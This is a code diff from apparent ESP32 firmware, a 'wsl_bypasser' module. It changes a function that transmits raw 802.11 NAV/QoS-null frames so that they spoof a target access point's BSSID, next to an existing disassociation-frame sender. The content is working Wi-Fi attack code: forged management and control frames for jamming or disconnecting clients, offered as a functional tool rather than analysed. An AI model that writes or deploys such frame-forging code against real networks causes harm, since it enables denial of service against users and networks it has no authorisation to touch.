@@ -241,28 +241,22 @@ void wsl_bypasser_send_disassoc_frame(const wifi_ap_record_t *ap_record) {
     _tx_with_fallback(frame, sizeof(frame));
 }
 
-esp_err_t wsl_bypasser_send_cts_frame(const uint8_t *target_mac) {
-    if (!target_mac) return ESP_ERR_INVALID_ARG;
+esp_err_t wsl_bypasser_send_cts_frame(const uint8_t *ap_bssid) {
+    if (!ap_bssid) return ESP_ERR_INVALID_ARG;
 
     uint8_t frame[sizeof(qos_null_frame_template)];
     memcpy(frame, qos_null_frame_template, sizeof(qos_null_frame_template));
 
-    /* Addr1 = DA = broadcast para todos ouvirem e setarem NAV */
+    /* Addr1 = DA = broadcast para todos no canal setarem NAV */
     memset(&frame[4], 0xff, 6);
-    /* Addr2 = SA = MAC da interface */
-    uint8_t mac[6];
-    esp_wifi_get_mac(WIFI_IF_STA, mac);
-    memcpy(&frame[10], mac, 6);
-    /* Addr3 = BSSID = MAC da interface */
-    memcpy(&frame[16], mac, 6);
+    /* Addr2 = SA = BSSID do AP alvo (forjado — clientes reconhecem) */
+    memcpy(&frame[10], ap_bssid, 6);
+    /* Addr3 = BSSID do AP alvo */
+    memcpy(&frame[16], ap_bssid, 6);
 
     esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
     if (ret != ESP_OK) {
-        ESP_LOGW(TAG, "NAV frame via AP falhou (0x%x), tentando STA", ret);
         ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
-        if (ret != ESP_OK) {
-            ESP_LOGE(TAG, "NAV frame falhou em ambas: 0x%x", ret);
-        }
     }
     return ret;
 }
